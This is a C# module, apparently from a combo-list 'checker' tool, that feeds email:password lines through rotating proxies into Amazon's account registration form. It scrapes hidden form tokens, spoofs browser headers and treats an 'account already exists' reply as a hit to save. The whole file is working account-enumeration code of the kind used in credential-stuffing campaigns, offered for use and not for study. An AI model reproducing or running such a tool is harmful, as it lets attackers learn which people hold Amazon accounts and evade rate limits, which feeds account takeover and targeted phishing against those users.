using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using HttpStatusCode = Leaf.xNet.HttpStatusCode;
using Console = Colorful.Console;

namespace UHQKEK.Modules.VM
{
    class Amazon
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AllowAutoRedirect = true;
                string str1 = httpRequest.Get("https://na.account.amazon.com/ap/register?showRememberMe=true&openid.pape.max_auth_age=0&enableGlobalAccountCreation=1&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&marketPlaceId=ATVPDKIKX0DER&signedMetricIdentifier=YB%2BUpNu5Nm%2BHZGrzkkqlqc19qxGKktAVpCc5K7tphAg%3D&language=en_US&pageId=iba&openid.return_to=https%3A%2F%2Fna.account.amazon.com%2Fap%2Foa%3FmarketPlaceId%3DATVPDKIKX0DER%26arb%3D5804516b-ea6c-48ea-86d4-4f040d73603e%26language%3Den_US&prevRID=YS0CK7NWMHE4C8MJ81W4&metricIdentifier=amzn1.application.8830f73e9e144f71904f36b10e9a042f&openid.assoc_handle=amzn_lwa_na&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&oauth2params=eyJwIjoiMldoS3BGbzFKd0NOTFZWUnRlU3dmVmgzWGtUY0ptNnlNajNtdno5TWVPdndpUGxpWFJ5cC9TVXNWa0VXUC9xdkFnemdHaHYxTFA2TEtPdkxrZkJYNU1SbjFuUGxlVk5XUnQrYlBYTm42QjZhOHJlR0Y2MC9yaXhMazRyZmFjZnNIbm4rcDErb2NucWV2NHp4UmJTUnRuSzNDUXU5dFpOemNMTXhzK2NhQ0ttV1ViQjRYdkJFNWI5Vm03cGlGNGxZVVovWFc2WkV0M0EvT2xZYUVkdzZTdWFNTmI0dnpnSGNmdURZT0NHSWd6OFJrNlQrMXM0MkY5bkhpd3lvSEJ3UUJxeHJ0U1FzOG1vUnVrVmxQZi9nYlJzWTJJM296WjB0SmdoNmxrb2JlYVhDTGNQZ3NTK28vbk54dkorb25BMEE1MzBXMml6UmYzMDhjNDZyRHlxeUJWdWYrVnh1Vmg2dGxqWTNYQ01nOG9vUTN6OXN2Yk9UMStCZEIxeU9aWVUyMGJxQVB5STI1Z2ZJa2YwME1iSDRBbncvNTRHQmhMTjdHRUo5d0xESkh4QVp4ZCtrS3lNUnRQTUMrSWNuNVlmOHd0NTJpbStNUHJkanZOeDF4b2k4WXdYSkFEOThwR0p1YytTVHVOckJsQzZLdm8wSEJ6S2hUZisxempFUE9udzl6NEt2NkptRFBnTkViS3dERFpDN3NmMjNYdFp6M2xzYlBvaG9XQ3dtOHZwNG9wbGwvY3NpRTNOK21YUVcxMGNTWEZkVG85bTZsM2tET1BqL0t4NHVBcTBvbFFZdmhmaE9Bc2xVbSt5bVl0T0tWV3pFMUpWN2RjeWdZM1JIWk5ZT3Z0ekpkc0YyMllBcVNTQ0ZWNkRSOVd4OFJXaEZFTHM3VTFVQzBHdWx5RTY2ZVlRZlFsOHhLcjI5ajdoNmthcVZZWVZDQmhIME0wb1hOTHRrend5dmR5cW9NZUZSZnJHQVVGU3IrQnBwRXdrUWNwV2tZTHNnN1lxU3czWUkyOFdZb2RCV0ZNZ3YrcGh3Rmt5NkErYkZEaTVDYkY5MklYSE5ZRWVDbE5GSlZjQWY5ZWJyaTJuQ2ZuTnNJaytob1pTamVsSVNFa0p3UGlGRmxRdUdyRDhNb1V6MmJlcjVpampuYVZKSDJkcEMrZEZHc2tuQXcxM0J0VzNwZ1BScERCR096Nk5hS3JnZjBBSVBBYzNBOEZQb0JOcHlFL1pQeDVvOTRmUXlHMy9KOVgzVlZyNjBMSXJNN08rQ1ZwWEg2UzZ3ZHR6dDJlSVF3NE5HR2xCNm5oc2tuTUtlQ2loZmorY0ZrSTdlQVhGRmtJUXBUTk8xcnVRemplWkZKOXpFY3hiQ2tydVZINkFjRllmOWJhY3NiSm14MnduQlpuTXVGS24zRTd3c2JLVXZvUS9Wa0QyV2dYRytXVWt2KytpL2JKMGVTSWk5SzR3MzkvdmczMVk3UXFlemNrUk9xWFozTGF5RHphT3g2YjB2aStkSHNiUUR3dVVXQXg5OWtlZW1iOHR5NkVrVTZWSXduQkdrQjFHQitTV3VvdUtoRFg0RGd3UFpZMEFJVEVHaEMwR29qSVlqbmJBTHgxZXlWSFE3dkJEMHR3akFsVERkOTN4a2xkL0QyRjRXZHlsTnc5bnU2cy83QitraXArRkxlRW5oMUhxbExIeDdzcTEvR00rNi9jRFNOZVZ3UTd5ekNjSjZqekZFNmNkaW1xWkd5V3dSaDdncE16MHRCeGx0TTNYMjllckV3QW43K0xjVy9zb3RMdmFmNjl6cDhOZXZOb1l2K1ZTdmNTNTJEbFgxQ3BqQnB1RFZzZXE5S1lSYU9obHhULythbU4wZURrT3lFM0VFS1UyQ29vQWZweHZyejR2TUh6cTFzYUxPM3JGWXZWKytIS3FxaUQ5S1pCbVNPVXFWUk9Ed2hNMnVTbGxNZXRsTzFhNW5ZK3lTSjR6Vk9rWmUyOVNHL0tRSmVQaDIydmpXMkhORUNlNlRQaGswYkNWQzVRTnAyVnUwNUZ0T3IzOTNLRHZWakl6b2FVbjliaXpRQ1BHalcxcjVVUG1HQUNZQlhOcVlFNjNJdkw3d1dhOVVDd0RjQUF5RXhpNmNPZjcycmh1bmh3b3RWMDFWdjZBKzBBbmJ4VmNjNThiVXdGWDYyNkNxb3lDQlBLVmFKaGRLT2RlMmdmQ1VER0RNR2NFVEVVU21meG1RdnFrRnRESHg3dnJtR2t5LzF5ajcyM3JKakZrZGhvUU1VRDQ1YStvanUyckF5SXRNcEtiTkxya3RNdVdPclk5c05nMWVMdkVUb25JTnBBbE4wTmlyWDI2QmNMRTNyekpNRzVWbk9hU1p6cC9iZzNmSS84QjJLOEpnN2s2N3JXYW44K3ZXdGJsczhWVFhvdC91czg5bEJnbFRzQ2JzZEJ2WEpTaWtucjBVbjNWWHV4Nm04Q1IxUXFPYmRaU0c3Mm9CS05MazBSTzhoREJKRVZhcCtHWk4wKzNLcTE2NzIrZ2hBYk9aNzNrdXRuZ2Y4U0xMSS82RXFlOUMvYlU1VWt5RkcvTlJFZzAwbDdQUStSa3dNaHgrQzlucFN4NUJ0MEFOYzNheXRHdjFYRWNUZHhZU0RVSnBCZjRSMW9SOFdzK0VBTCsrWlNseVI5d2dBSncxUndyOWI0c0ZZY3N1bWgzTUVpVm9BbEFKc3hPUDA0SnVMb215bmxudU95MVRDZXZ1d2N0elJOdUVhQmYwWWJ1WXRGSWZnNHV5VEpHSlZXOU9kZ3dTdy9FS2tnNkhXTUZ6b1RVRkJLU2Y3bDE4MVhHSWwyUEJqUCt3R3Q2Q0cxRkwrNGk0L1hSclpzMnJ0UmVYSUJXS29nMDZnMnVNWXd6dmJLQ1I4SzcwSko5V2VTQWNzMnVwVG9GUGFhalQ1Q1pLcmNUZzNxZysvcHJOZG5YMmV2bEdCVVhGWUIySTVGZzc1L2RsSWxnWi9HdkkrZzA2MGV0TjNzaXR4VmtqMEdaOTV4RFNLWFEraHVEdDcyRnY2dU5uKytWNStTM2ZlQVUvU1NqQlpHSGZQNmEzT2tEU0VQcHFNcEVDemVXb2huMFBwY3NHY2NGazZ0UDNFdnpCSVpuSmlNSjVXMEVsNU9WcXhVVHV6RVBSTkdCaGw1WklkRlBSNlE5WGNGcldzcjg1NFp5WVRQMkhnbU9ZUUQrcXFSQjlSYlhXcmxiU3g0N1JybHhKOTh6SlRUOXNYRlN4Qkh1UXVMMEoybUxHRWlHcnZZUVMrSjR5S2NwaWp1Z1UwSGFHM3VMK1lJWjc2bk0rNlRCVVRXYkx5VGNJbTJVS20wbGtpakwvNHZyZER6SHo2dDk3NGdoaE03ZjM4UFNFbENrOW9HOTFTcndYNDN6Q1ZETUVlQUI5Q0hjOUdHRk9EOEJ3KzRONTc1cEkvazkzam1rNkRuN0ttL01ZaytVWmFtdGZMTTE0NmYzWWZCYlhFTTlabFhZS3Y1ZHBDS2NlbWl1bW94ZDdqei9ERi96SXdlUEpreU9wa3pEKzBmMS9TY1RGeFF2d0N0WVZJQTNRakZndGVteW85ZWZUV1hhZjBQTGNBUEZISmI4MktSeklmOWdpazJnbkRSTy9kbjl3bUprQnpITzZYeHJvRW93RERQaEM2Q3FkaFl4Mks4TTBwQ1BIOUpKaDg5cVp6S3k1Zks3N3k1dEdyVjk5Sm9WUnVacDVIYzJRZGx1bWZOTENBQ0t5MFpuRFdkMDdHcStKeVVXUk1wK3R0bWtJR01MdjU4amVobDVTVjJ3eWhxeVBTNXMvKzVFUWd4M1ZtNEx2TDNTODVjc0pDRGRxRkljbEFlS2MrRWVCNXltRCtKNmt3WTlpYnA2aUxKTWlFa2trU2NlbXZFeWRtTzFaS1lZL3Ftd0ExNm9WNCtmVzh6WGQyUDc0TE5XK1lUY3BreHNBY3dTdUZ4UXMxaDlPWGVBdXBLV1BLUU0yaXpPRUhReEtab29CRkZHd2JvWU5OL29ncGZ3UmRvemxKWC9xVE1JYjdwbmJXTjZHVUc2aktSNEtHaHM5VnZKV0FsYnhlOVJ1VjVVaGdNb0NxZkZ5STBSS2J1ck9zejJjRjBSTHhham1kU1J4TDh6dXRtSnJaM3hRZWR1MW5EZisrbUo5TDl0YkJPLzJsNGJ2VGlEWk9vcm14dTVVVHZuaDhDc3BjWExUNlJyV2toMU84Q09BUllwS01hNFduZVg4M3haL0JXeUxvTS93ZitBejY3dFRNNkpNTXZxWkxsaGhpV2JJclgvTEhEdFBjbm4zMXNXQUE0UUVWNTZtQXVNPSIsImkiOiJ3K2NjTjJoSzhyalh4cWQ4aHIwR2h3PT0iLCJzIjoiMHVCczBiYTVhQ3FzVWRMenlZU3JRZU1wd0c5QjVoTTBjZDZubFNibWxsST0iLCJldiI6MSwiaHYiOjF9").ToString();
                string ss = Cryptography.LR(str1, "name=\"siteState\" value=\"", "\"").FirstOrDefault();
                string ORT = Cryptography.LR(str1, "name=\"openid.return_to\" value=\"", "\"").FirstOrDefault();
                string PRID = Cryptography.LR(str1, "name=\"prevRID\" value=\"", "\"").FirstOrDefault();
                string WFS = Cryptography.LR(str1, "name=\"workflowState\" value=\"", "\"").FirstOrDefault();

                string AAT = Cryptography.LR(str1, "name=\"appActionToken\" value=\"", "\"").FirstOrDefault();
                httpRequest.AllowAutoRedirect = true;
                CookieContainer container = new CookieContainer();
                string str2 = httpRequest.Cookies.GetCookies("URL HERE")["session-id"].ToString();

                string str3 = httpRequest.Cookies.GetCookies("URL HERE")["session-id-time"].ToString();
                httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
                httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                httpRequest.AddHeader("Cookie", str2 + "; " + str3);
                httpRequest.AddHeader("Host", "na.account.amazon.com");
                httpRequest.AddHeader("Origin", "https://na.account.amazon.com");
                httpRequest.AddHeader("Referer", "https://na.account.amazon.com/");
                httpRequest.AddHeader("sec-ch-ua", "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \"; Not A Brand\";v=\"99\"");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36");
                string str4 = httpRequest.Post("https://na.account.amazon.com/ap/register", "appActionToken=" + AAT + "&appAction=REGISTER&openid.return_to=" + ORT + "&prevRID=" + PRID + "&workflowState=" + WFS + "&customerName=Json+Bear&email=" + strArray1[0] + "&emailCheck=" + strArray1[0] + "&password=UTN1Mg6L&passwordCheck=UTN1Mg6L&continue=Create+account&metadata1=", "application/x-www-form-urlencoded").ToString();
                //Console.Write(str4);
                //Console.ReadLine();
                if (str4.Contains("but an account already exists with the email address"))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Green);
                    }
                    Program.Save(combo, "Amazon VM");
                    return true;
                }
                else if (str4.Contains("Solve this puzzle to protect your account"))
                {
                    Interlocked.Increment(ref Program.Fail);
                    Interlocked.Increment(ref Program.Check);
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    ////Program.Save(combo, "Invalids");
                    return true;
                }
                else
                {
                    ++Program.Error;
                    return false;
                }
            }
            catch (Exception)
            {
                //Console.WriteLine(ex);
                ++Program.Error;
                return false;
            }
        }
    }
}
